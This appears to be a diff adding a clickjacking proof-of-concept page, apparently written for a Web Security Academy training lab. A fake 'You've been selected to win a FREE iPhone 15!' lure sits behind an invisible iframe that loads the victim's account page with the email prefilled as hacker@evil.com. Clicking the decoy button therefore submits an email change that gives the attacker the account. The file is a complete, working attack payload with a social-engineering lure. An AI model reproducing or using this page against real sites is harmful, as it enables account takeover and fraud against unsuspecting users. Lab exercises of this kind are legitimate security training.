@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Win a Free Prize!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f8ff;
+            text-align: center;
+            padding: 50px;
+        }
+        
+        .decoy-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            max-width: 500px;
+            height: 500px;
+            margin: 0 auto;
+            position: relative;
+        }
+        
+        .prize-button {
+            background-color: #ff4444;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            position: absolute;
+            cursor: pointer;
+            margin-top: 20px;
+            bottom: 84px;
+            left: 23px;
+        }
+        
+        .prize-button:hover {
+            background-color: #cc3333;
+        }
+        
+        #target-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 500px;
+            opacity: 0;
+            z-index: 2;
+        }
+        
+        .clickable-area {
+            position: absolute;
+            top: 380px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 130px;
+            height: 40px;
+            z-index: 3;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="decoy-content">
+        <h1>🎉 Congratulations! 🎉</h1>
+        <p>You've been selected to win a FREE iPhone 15!</p>
+        <p>Click the button below to claim your prize now!</p>
+        
+        <button class="prize-button">Click Here!</button>
+        
+        <iframe id="target-iframe" 
+                src="https://0ada00c004f09046806e859c00c700c7.web-security-academy.net/my-account?id=wiener&email=hacker@evil.com"
+                frameborder="0"
+>
+        </iframe>
+        
+        <div class="clickable-area"></div>
+    </div>
+</body>
+</html>
